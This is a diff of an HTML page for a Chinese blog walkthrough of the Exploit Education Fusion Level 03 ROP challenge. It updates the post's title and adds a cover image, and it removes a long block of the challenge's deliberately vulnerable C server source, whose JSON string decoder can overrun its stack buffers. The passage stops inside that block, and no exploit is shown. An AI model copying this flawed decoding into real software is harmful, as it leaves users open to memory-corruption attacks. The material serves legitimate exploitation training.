@@ -1,18 +1,19 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Fusion Level 03 Walkthrough..?'><title>[DRAFT] #{username}！这是我最后的 ROP 了！收下吧！</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Fusion Level 03 Walkthrough..迄今为止最艰难的一题了...'><title>#{username}！这是我最后的 ROP 了！收下吧！</title>
 
 <link rel='canonical' href='/p/fusion_level_03/'>
 
-<link rel="stylesheet" href="/scss/style.min.66ce53af975830b01002d38d4eb823c7b47d1e58455fb6b3fecbcd684f02b004.css"><meta property='og:title' content='[DRAFT] #{username}！这是我最后的 ROP 了！收下吧！'>
-<meta property='og:description' content='Fusion Level 03 Walkthrough..?'>
+<link rel="stylesheet" href="/scss/style.min.66ce53af975830b01002d38d4eb823c7b47d1e58455fb6b3fecbcd684f02b004.css"><meta property='og:title' content='#{username}！这是我最后的 ROP 了！收下吧！'>
+<meta property='og:description' content='Fusion Level 03 Walkthrough..迄今为止最艰难的一题了...'>
 <meta property='og:url' content='/p/fusion_level_03/'>
 <meta property='og:site_name' content='Senri&#39;s Memos'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-05-30T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-30T00:00:00&#43;00:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-05-30T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-06-05T11:10:50&#43;00:00'/><meta property='og:image' content='/p/fusion_level_03/cover.png' />
 <meta name="twitter:site" content="@kurususenri">
-    <meta name="twitter:creator" content="@kurususenri"><meta name="twitter:title" content="[DRAFT] #{username}！这是我最后的 ROP 了！收下吧！">
-<meta name="twitter:description" content="Fusion Level 03 Walkthrough..?">
+    <meta name="twitter:creator" content="@kurususenri"><meta name="twitter:title" content="#{username}！这是我最后的 ROP 了！收下吧！">
+<meta name="twitter:description" content="Fusion Level 03 Walkthrough..迄今为止最艰难的一题了..."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/fusion_level_03/cover.png' />
     
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-KT4W9WZKC8"></script>
@@ -231,8 +232,20 @@ if (!doNotTrack) {
     </ol>
 </aside>
 <main class="main full-width">
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/fusion_level_03/">
+                <img src="/p/fusion_level_03/cover_hu574291cd7b329f663b2ad48fb6ab2524_1741229_800x0_resize_box_3.png"
+                        srcset="/p/fusion_level_03/cover_hu574291cd7b329f663b2ad48fb6ab2524_1741229_800x0_resize_box_3.png 800w, /p/fusion_level_03/cover_hu574291cd7b329f663b2ad48fb6ab2524_1741229_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="437" 
+                        loading="lazy"
+                        alt="Featured image of post #{username}！这是我最后的 ROP 了！收下吧！" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
     
@@ -255,12 +268,12 @@ if (!doNotTrack) {
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/fusion_level_03/">[DRAFT] #{username}！这是我最后的 ROP 了！收下吧！</a>
+            <a href="/p/fusion_level_03/">#{username}！这是我最后的 ROP 了！收下吧！</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            Fusion Level 03 Walkthrough..?
+            Fusion Level 03 Walkthrough..迄今为止最艰难的一题了...
         </h3>
         
     </div>
@@ -296,6 +309,8 @@ if (!doNotTrack) {
     <p><a class="link" href="https://mzh.moegirl.org.cn/zh-hans/%e8%bf%99%e6%98%af%e6%88%91%e6%9c%80%e5%90%8e%e7%9a%84%e6%b3%a2%e7%ba%b9"  target="_blank" rel="noopener"
     >☞ 这是我最后的波纹</a></p>
 <p>总之要返校了，之后大概没太多时间玩这些了&hellip;</p>
+<p>一开始我看着这题，感觉也就是源码有点长吧</p>
+<p>结果却花了三周&hellip;</p>
 <h2 id="level-03">Level 03</h2>
 <p><a class="link" href="https://exploit.education/fusion/level03/"  target="_blank" rel="noopener"
     >☞ https://exploit.education/fusion/level03/</a></p>
@@ -340,283 +355,10 @@ if (!doNotTrack) {
 </tbody>
 </table></div>
 <p><strong>Source code</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">include</span> <span class="s">&#34;../common/common.c&#34;</span>    
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;json/json.h&#34;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">gRequest</span><span class="p">;</span> <span class="c1">// request buffer
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="n">gRequestMax</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">;</span>      <span class="c1">// maximum buffer size
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="n">gRequestSize</span><span class="p">;</span>       <span class="c1">// current buffer size
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="n">token</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">gServerIP</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">gContents</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">gContents_len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">gTitle</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">gTitle_len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">json_object</span> <span class="o">*</span><span class="n">gObj</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">generate_token</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">getpeername</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Unable to getpeername(0, ...): &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl">  <span class="n">srand</span><span class="p">((</span><span class="n">getpid</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">getppid</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">)</span> <span class="o">^</span>
-</span></span><span class="line"><span class="cl">      <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">token</span><span class="p">,</span> <span class="s">&#34;// %s:%d-%d-%d-%d-%d&#34;</span><span class="p">,</span> <span class="n">inet_ntoa</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">      <span class="n">ntohs</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span><span class="p">),</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">),</span> <span class="n">rand</span><span class="p">(),</span> <span class="n">rand</span><span class="p">(),</span>
-</span></span><span class="line"><span class="cl">      <span class="n">rand</span><span class="p">());</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">send_token</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="n">generate_token</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">read_request</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">gRequest</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">gRequestMax</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">gRequest</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Failed to allocate %d bytes&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">      <span class="n">gRequestMax</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">gRequest</span> <span class="o">+</span> <span class="n">gRequestSize</span><span class="p">,</span> <span class="n">gRequestMax</span> <span class="o">-</span> <span class="n">gRequestSize</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Failed to read %d bytes ... &#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">          <span class="n">gRequestMax</span> <span class="o">-</span> <span class="n">gRequestSize</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="n">gRequestSize</span> <span class="o">+=</span> <span class="n">ret</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">gRequestSize</span> <span class="o">==</span> <span class="n">gRequestMax</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="n">gRequest</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">(</span><span class="n">gRequest</span><span class="p">,</span> <span class="n">gRequestMax</span> <span class="o">*</span> <span class="mi">2</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="k">if</span><span class="p">(</span><span class="n">gRequest</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">              <span class="n">errx</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Failed to realloc from %d bytes &#34;</span>
-</span></span><span class="line"><span class="cl">              <span class="s">&#34;to %d bytes &#34;</span><span class="p">,</span> <span class="n">gRequestMax</span><span class="p">,</span> <span class="n">gRequestMax</span> <span class="o">*</span> <span class="mi">2</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="p">}</span>
-</span></span><span class="line"><span class="cl">          <span class="n">gRequestMax</span> <span class="o">*=</span> <span class="mi">2</span><span class="p">;</span>  
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="n">close</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;openssl/hmac.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">validate_request</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">result</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">invalid</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">gRequest</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">token</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">      <span class="n">errx</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Token not found!&#34;</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl">      <span class="c1">// XXX won&#39;t be seen by user
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">HMAC</span><span class="p">(</span><span class="n">EVP_sha1</span><span class="p">(),</span> <span class="n">token</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">token</span><span class="p">),</span> <span class="n">gRequest</span><span class="p">,</span> <span class="n">gRequestSize</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">      <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span> <span class="c1">// hashcash with added hmac goodness
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  
-</span></span><span class="line"><span class="cl">  <span class="n">invalid</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">result</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// Not too bad :&gt;
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="n">invalid</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">      <span class="n">errx</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Checksum failed! (got %02x%02x%02x%02x...)&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">      <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">result</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">result</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">result</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">      <span class="c1">// XXX won&#39;t be seen by user.
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">parse_request</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="n">json_object</span> <span class="o">*</span><span class="n">new_obj</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="n">new_obj</span> <span class="o">=</span> <span class="n">json_tokener_parse</span><span class="p">(</span><span class="n">gRequest</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">is_error</span><span class="p">(</span><span class="n">new_obj</span><span class="p">))</span> <span class="n">errx</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Unable to parse request&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">gObj</span> <span class="o">=</span> <span class="n">new_obj</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">decode_string</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">dest_len</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">swap</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">what</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">start</span><span class="p">,</span> <span class="o">*</span><span class="n">end</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  
-</span></span><span class="line"><span class="cl">  <span class="n">swap</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="n">start</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="c1">// make sure we don&#39;t over the end of the allocated space.
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">end</span> <span class="o">=</span> <span class="n">dest</span> <span class="o">+</span> <span class="o">*</span><span class="n">dest_len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">src</span> <span class="o">&amp;&amp;</span> <span class="n">dest</span> <span class="o">!=</span> <span class="n">end</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="c1">// printf(&#34;*src = %02x, dest = %p, end = %p\n&#34;, (unsigned char) 
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// *src, dest, end);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">src</span> <span class="o">==</span> <span class="sc">&#39;\\&#39;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="n">src</span><span class="o">++</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">          <span class="c1">// printf(&#34;-&gt; in src == &#39;\\&#39;, next byte is %02x\n&#34;, *src);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">          <span class="k">switch</span><span class="p">(</span><span class="o">*</span><span class="n">src</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">              <span class="k">case</span> <span class="sc">&#39;&#34;&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">              <span class="k">case</span> <span class="sc">&#39;\\&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">              <span class="k">case</span> <span class="sc">&#39;/&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                  <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">src</span><span class="o">++</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                  <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">              <span class="k">case</span> <span class="sc">&#39;b&#39;</span><span class="o">:</span> <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39;\b&#39;</span><span class="p">;</span> <span class="n">src</span><span class="o">++</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">              <span class="k">case</span> <span class="sc">&#39;f&#39;</span><span class="o">:</span> <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39;\f&#39;</span><span class="p">;</span> <span class="n">src</span><span class="o">++</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">              <span class="k">case</span> <span class="sc">&#39;n&#39;</span><span class="o">:</span> <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39;\n&#39;</span><span class="p">;</span> <span class="n">src</span><span class="o">++</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">              <span class="k">case</span> <span class="sc">&#39;r&#39;</span><span class="o">:</span> <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39;\r&#39;</span><span class="p">;</span> <span class="n">src</span><span class="o">++</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">              <span class="k">case</span> <span class="sc">&#39;t&#39;</span><span class="o">:</span> <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39;\t&#39;</span><span class="p">;</span> <span class="n">src</span><span class="o">++</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">              <span class="k">case</span> <span class="sc">&#39;u&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                  <span class="n">src</span><span class="o">++</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">                  <span class="c1">// printf(&#34;--&gt; in \\u handling. got %.4s\n&#34;, 
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                  <span class="c1">// src);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">                  <span class="n">memcpy</span><span class="p">(</span><span class="n">swap</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                  <span class="n">p</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                  <span class="n">what</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">swap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">                  <span class="c1">// printf(&#34;--&gt; and in hex, %08x\n&#34;, what);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">                  <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="n">what</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                  <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                  <span class="n">src</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                  <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">              <span class="k">default</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                  <span class="n">errx</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&#34;Unhandled encoding found&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                  <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">          <span class="p">}</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="n">dest</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">src</span><span class="o">++</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="c1">// and record the actual space taken up
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="n">dest_len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">dest</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">start</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="c1">// printf(&#34;and the length of the function is ... %d bytes&#34;, *dest_len);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">handle_request</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">title</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">tags</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">contents</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">tag_cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">title</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="n">contents</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">contents</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">json_object_object_foreach</span><span class="p">(</span><span class="n">gObj</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&#34;tags&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
